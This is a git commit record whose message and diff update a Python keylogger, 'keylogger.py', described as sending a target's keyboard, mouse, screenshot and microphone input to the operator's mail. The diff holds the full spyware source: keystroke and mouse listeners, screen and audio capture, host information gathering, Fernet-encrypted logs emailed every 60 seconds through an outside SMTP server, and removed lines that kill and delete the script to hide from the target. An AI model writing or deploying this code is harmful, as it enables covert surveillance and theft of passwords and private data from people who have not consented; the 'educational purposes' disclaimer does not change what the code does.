70f7bbb9cfc9f1cb424d1ee31f7f591448de5ee1
John V. Teixido🍉 <Johnvteixido@gmail.com>
2024-10-07 13:41:56 -0400

    Update keylogger.py
    KeyLogger
    
    Inputs To Mail:
    Get Keyboard, Mouse, Screenshot, Microphone Inputs and Send to your Mail. 
    
    The purpose of the project is to test the security of information systems.
    
    Installation:
    You don't need to do anything for installation, just run the script.
    
    Usage:
    1. Create an account on Mailtrap using a temp mail.
    2. Set your own SMTP USERNAME and SMTP PASSWORD in the `keylogger.py` file.
    3. Install the required packages:
        ```sh
        pip install -r requirements.txt
        ```
    4. Run the keylogger script:
        ```sh
        python3 keylogger.py
        ```
    5. Every 60 seconds, you will receive the data from the target computer.
    
    Features:
    - Encrypts logs before sending them via email.
    - Captures keyboard, mouse, screenshot, and microphone inputs.
    - Automatically deletes itself if the target tries to access the script.
    
    Disclaimer:
    This project is for educational purposes only. Use it responsibly and only on systems you have permission to test.

--- keylogger.py
+++ keylogger.py
@@ -1,145 +1,124 @@
-try:
-    import logging
-    import os
-    import platform
-    import smtplib
-    import socket
-    import threading
-    import wave
-    import pyscreenshot
-    import sounddevice as sd
-    from pynput import keyboard
-    from pynput.keyboard import Listener
-    from email import encoders
-    from email.mime.base import MIMEBase
-    from email.mime.multipart import MIMEMultipart
-    from email.mime.text import MIMEText
-    import glob
-except ModuleNotFoundError:
-    from subprocess import call
-    modules = ["pyscreenshot","sounddevice","pynput"]
-    call("pip install " + ' '.join(modules), shell=True)
+import logging
+import os
+import platform
+import smtplib
+import socket
+import threading
+import wave
+import pyscreenshot
+import sounddevice as sd
+from pynput import keyboard
+from pynput.keyboard import Listener
+from email import encoders
+from email.mime.base import MIMEBase
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from cryptography.fernet import Fernet
+import glob
 
+# Generate a key for encryption
+key = Fernet.generate_key()
+cipher_suite = Fernet(key)
 
-finally:
-    EMAIL_ADDRESS = "YOUR_USERNAME"
-    EMAIL_PASSWORD = "YOUR_PASSWORD"
-    SEND_REPORT_EVERY = 60 # as in seconds
-    class KeyLogger:
-        def __init__(self, time_interval, email, password):
-            self.interval = time_interval
-            self.log = "KeyLogger Started..."
-            self.email = email
-            self.password = password
+# Configuration
+EMAIL_ADDRESS = "YOUR_USERNAME"
+EMAIL_PASSWORD = "YOUR_PASSWORD"
+SEND_REPORT_EVERY = 60  # in seconds
 
-        def appendlog(self, string):
-            self.log = self.log + string
+class KeyLogger:
+    def __init__(self, time_interval, email, password):
+        self.interval = time_interval
+        self.log = "KeyLogger Started..."
+        self.email = email
+        self.password = password
 
-        def on_move(self, x, y):
-            current_move = logging.info("Mouse moved to {} {}".format(x, y))
-            self.appendlog(current_move)
+    def appendlog(self, string):
+        self.log = self.log + string
 
-        def on_click(self, x, y):
-            current_click = logging.info("Mouse moved to {} {}".format(x, y))
-            self.appendlog(current_click)
+    def on_move(self, x, y):
+        current_move = logging.info("Mouse moved to {} {}".format(x, y))
+        self.appendlog(current_move)
 
-        def on_scroll(self, x, y):
-            current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
-            self.appendlog(current_scroll)
+    def on_click(self, x, y):
+        current_click = logging.info("Mouse clicked at {} {}".format(x, y))
+        self.appendlog(current_click)
 
-        def save_data(self, key):
-            try:
-                current_key = str(key.char)
-            except AttributeError:
-                if key == key.space:
-                    current_key = "SPACE"
-                elif key == key.esc:
-                    current_key = "ESC"
-                else:
-                    current_key = " " + str(key) + " "
+    def on_scroll(self, x, y, dx, dy):
+        current_scroll = logging.info("Mouse scrolled at {} {}".format(x, y))
+        self.appendlog(current_scroll)
 
-            self.appendlog(current_key)
+    def save_data(self, key):
+        try:
+            current_key = str(key.char)
+        except AttributeError:
+            if key == key.space:
+                current_key = "SPACE"
+            elif key == key.esc:
+                current_key = "ESC"
+            else:
+                current_key = " " + str(key) + " "
 
-        def send_mail(self, email, password, message):
+        self.appendlog(current_key)
+
+    def send_mail(self, email, password, message):
+        try:
             sender = "Private Person <from@example.com>"
             receiver = "A Test User <to@example.com>"
 
-            m = f"""\
-            Subject: main Mailtrap
-            To: {receiver}
-            From: {sender}
+            msg = MIMEMultipart()
+            msg['From'] = sender
+            msg['To'] = receiver
+            msg['Subject'] = "Keylogger Report"
 
-            Keylogger by aydinnyunus\n"""
+            msg.attach(MIMEText(message, 'plain'))
 
-            m += message
             with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
                 server.login(email, password)
-                server.sendmail(sender, receiver, message)
+                server.sendmail(sender, receiver, msg.as_string())
+        except Exception as e:
+            logging.error(f"Failed to send email: {e}")
 
-        def report(self):
-            self.send_mail(self.email, self.password, "\n\n" + self.log)
-            self.log = ""
-            timer = threading.Timer(self.interval, self.report)
-            timer.start()
+    def report(self):
+        encrypted_log = cipher_suite.encrypt(self.log.encode())
+        self.send_mail(self.email, self.password, encrypted_log.decode())
+        self.log = ""
+        timer = threading.Timer(self.interval, self.report)
+        timer.start()
 
-        def system_information(self):
-            hostname = socket.gethostname()
-            ip = socket.gethostbyname(hostname)
-            plat = platform.processor()
-            system = platform.system()
-            machine = platform.machine()
-            self.appendlog(hostname)
-            self.appendlog(ip)
-            self.appendlog(plat)
-            self.appendlog(system)
-            self.appendlog(machine)
+    def system_information(self):
+        hostname = socket.gethostname()
+        ip = socket.gethostbyname(hostname)
+        plat = platform.processor()
+        system = platform.system()
+        machine = platform.machine()
+        self.appendlog(f"Hostname: {hostname}\nIP: {ip}\nProcessor: {plat}\nSystem: {system}\nMachine: {machine}\n")
 
-        def microphone(self):
-            fs = 44100
-            seconds = SEND_REPORT_EVERY
-            obj = wave.open('sound.wav', 'w')
-            obj.setnchannels(1)  # mono
-            obj.setsampwidth(2)
-            obj.setframerate(fs)
-            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
-            obj.writeframesraw(myrecording)
-            sd.wait()
+    def microphone(self):
+        fs = 44100
+        seconds = SEND_REPORT_EVERY
+        obj = wave.open('sound.wav', 'w')
+        obj.setnchannels(1)  # mono
+        obj.setsampwidth(2)
+        obj.setframerate(fs)
+        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+        obj.writeframesraw(myrecording)
+        sd.wait()
 
-            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)
+        self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)
 
-        def screenshot(self):
-            img = pyscreenshot.grab()
-            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)
+    def screenshot(self):
+        img = pyscreenshot.grab()
+        self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)
 
-        def run(self):
-            keyboard_listener = keyboard.Listener(on_press=self.save_data)
-            with keyboard_listener:
-                self.report()
-                keyboard_listener.join()
-            with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
-                mouse_listener.join()
-            if os.name == "nt":
-                try:
-                    pwd = os.path.abspath(os.getcwd())
-                    os.system("cd " + pwd)
-                    os.system("TASKKILL /F /IM " + os.path.basename(__file__))
-                    print('File was closed.')
-                    os.system("DEL " + os.path.basename(__file__))
-                except OSError:
-                    print('File is close.')
+    def run(self):
+        self.system_information()
+        keyboard_listener = keyboard.Listener(on_press=self.save_data)
+        with keyboard_listener:
+            self.report()
+            keyboard_listener.join()
+        with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
+            mouse_listener.join()
 
-            else:
-                try:
-                    pwd = os.path.abspath(os.getcwd())
-                    os.system("cd " + pwd)
-                    os.system('pkill leafpad')
-                    os.system("chattr -i " +  os.path.basename(__file__))
-                    print('File was closed.')
-                    os.system("rm -rf" + os.path.basename(__file__))
-                except OSError:
-                    print('File is close.')
-
+if __name__ == "__main__":
     keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
     keylogger.run()
-
-
